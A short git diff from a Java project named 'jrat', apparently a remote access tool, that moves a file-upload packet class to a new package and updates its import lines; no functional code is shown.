@@ -1,7 +1,8 @@
-package jrat.controller.packets.outgoing;
+package jrat.module.fs.packets;
 
 import jrat.controller.Slave;
-import jrat.controller.threads.ThreadUploadFile;
+import jrat.controller.packets.outgoing.OutgoingPacket;
+import jrat.module.fs.ThreadUploadFile;
 
 import java.io.File;
 
